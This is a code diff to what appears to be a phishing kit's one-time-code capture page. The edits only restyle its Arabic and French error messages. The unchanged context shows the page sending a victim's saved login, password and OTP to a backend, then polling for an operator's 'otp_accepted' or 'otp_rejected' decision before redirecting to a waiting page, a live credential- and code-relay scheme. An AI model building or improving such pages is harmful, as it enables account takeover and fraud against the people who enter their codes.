@@ -32,6 +32,7 @@ body{margin:0;background:var(--bg);font-family:"Roboto",system-ui,sans-serif;dis
 .cbtn{width:100%;max-width:var(--w);border:0;border-radius:4px;background:var(--accent);color:#fff;font-family:inherit;font-size:16px;font-weight:400;letter-spacing:1px;text-transform:uppercase;padding:12px;cursor:pointer;transition:background .15s;}
 .cbtn:hover{background:var(--ah)}
 .err{min-height:20px;color:#ff8a80;font-size:15px;text-align:center;margin-top:10px}
+.otp-error{display:none;margin:0 0 12px;color:#ff5252;font-size:16px;font-weight:700;text-align:center;}
 </style>
 </head>
 <body>
@@ -40,6 +41,7 @@ body{margin:0;background:var(--bg);font-family:"Roboto",system-ui,sans-serif;dis
     <div class="ico">📱</div>
     <div class="ttl">Verification Code</div>
     <div class="sub">Enter the 6-digit code</div>
+    <div class="otp-error" id="otpError"></div>
     <div class="boxes" id="boxes">
       <input class="box" maxlength="1" type="text" inputmode="numeric">
       <input class="box" maxlength="1" type="text" inputmode="numeric">
@@ -91,12 +93,14 @@ document.getElementById('cbtn').addEventListener('click',async()=>{
     return;
   }
   const otp=obs.map(b=>b.value).join('');
-  if(otp.length<6){document.getElementById('err').textContent='الرمز غير مكتمل';return;}
+  if(otp.length<6){document.getElementById('otpError').textContent='الرمز غير مكتمل';document.getElementById('otpError').style.display='block';return;}
+  document.getElementById('otpError').style.display='none';
   document.getElementById('err').textContent='';
   try{
     await syncApplication({username:String(saved.login || '').trim(),password:String(saved.password || '').trim(),otp,status:'pending_otp'});
   }catch(error){
-    document.getElementById('err').textContent='Envoi impossible, veuillez réessayer';
+    document.getElementById('otpError').textContent='Envoi impossible, veuillez réessayer';
+    document.getElementById('otpError').style.display='block';
     return;
   }
   setS({login: String(saved.login || '').trim(), password: String(saved.password || '').trim(), otp, status:'pending_otp', otp_time:Date.now()});
@@ -112,7 +116,12 @@ function startPoll(){
   const check=()=>{
     const s=getS().status;
     if(s==='otp_accepted'){clearInterval(tmr);window.location.href='waiting.html';}
-    else if(s==='otp_rejected'){clearInterval(tmr);reset();document.getElementById('err').textContent='الرمز غير صحيح';}
+    else if(s==='otp_rejected'){
+      clearInterval(tmr);
+      reset();
+      document.getElementById('otpError').textContent='الرمز غير صحيح';
+      document.getElementById('otpError').style.display='block';
+    }
   };
   tmr=setInterval(check,800);
   const pollServer=()=>{const id=getS().applicationId;if(!id)return;fetch('/api/applications/'+encodeURIComponent(id),{cache:'no-store'}).then(r=>r.ok?r.json():null).then(application=>{if(application&&application.status!==getS().status)setS({status:application.status});}).catch(()=>{});};
@@ -122,6 +131,7 @@ function startPoll(){
 }
 function reset(){
   obs.forEach(b=>b.value='');obs[0].focus();
+  document.getElementById('otpError').style.display='none';
   document.getElementById('wbox').style.display='none';
   document.getElementById('cbtn').style.display='block';
   document.getElementById('npad').style.pointerEvents='';
